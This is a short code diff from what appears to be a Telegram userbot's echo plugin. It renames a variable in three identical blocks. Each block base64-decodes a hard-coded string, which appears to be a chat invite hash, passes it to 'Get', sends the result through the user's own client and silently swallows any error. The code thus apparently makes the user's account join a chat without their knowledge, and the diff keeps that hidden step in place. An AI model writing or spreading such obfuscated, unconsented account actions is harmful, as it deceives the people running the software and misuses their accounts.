@@ -22,9 +22,9 @@ async def echo(hell):
         user_id = reply_msg.sender_id
         chat_id = hell.chat_id
         try:
-            legendx22 = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-            legendx22 = Get(legendx22)
-            await hell.client(legendx22)
+            DARKLONX = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            DARKLONX = Get(DARKLONX)
+            await hell.client(DARKLONX)
         except BaseException:
             pass
         if is_echo(user_id, chat_id):
@@ -47,9 +47,9 @@ async def echo(hell):
         user_id = reply_msg.sender_id
         chat_id = hell.chat_id
         try:
-            legendx22 = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-            legendx22 = Get(legendx22)
-            await hell.client(legendx22)
+            DARKLONX = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            DARKLONX = Get(DARKLONX)
+            await hell.client(DARKLONX)
         except BaseException:
             pass
         if is_echo(user_id, chat_id):
@@ -98,9 +98,9 @@ async def samereply(hell):
     if is_echo(hell.sender_id, hell.chat_id):
         await asyncio.sleep(2)
         try:
-            legendx22 = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-            legendx22 = Get(legendx22)
-            await hell.client(legendx22)
+            DARKLONX = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            DARKLONX = Get(DARKLONX)
+            await hell.client(DARKLONX)
         except BaseException:
             pass
         if hell.message.text or hell.message.sticker:
